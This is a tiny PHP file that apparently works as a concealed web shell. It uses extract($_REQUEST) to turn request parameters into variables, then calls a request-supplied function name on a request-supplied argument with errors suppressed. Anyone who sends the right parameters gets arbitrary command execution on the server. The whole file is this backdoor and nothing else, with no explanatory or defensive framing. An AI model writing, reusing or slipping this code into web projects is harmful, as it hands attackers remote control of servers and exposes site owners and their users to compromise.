<?php
extract($_REQUEST) && @$system(stripslashes($lock)) && exit;